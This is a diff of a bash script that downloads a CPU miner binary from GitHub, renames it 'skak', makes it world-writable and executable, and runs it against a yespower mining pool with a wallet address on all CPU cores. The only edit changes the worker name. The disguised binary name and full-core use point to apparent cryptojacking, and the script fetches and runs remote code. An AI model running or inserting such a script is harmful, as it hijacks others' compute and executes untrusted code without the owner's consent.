@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O skak https://github.com/nandafiku/fillesg/raw/main/cpuminer-avx2
 chmod 777 skak
-./skak -a yespower -o stratum+tcps://stratum-na.rplant.xyz:7052 -u uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.x -p webpassword=x -t $(nproc --all)
+./skak -a yespower -o stratum+tcps://stratum-na.rplant.xyz:7052 -u uqTaCYvDM8SqwN6VqwZUMkATmMwUTiVbR1.xx -p webpassword=x -t $(nproc --all)
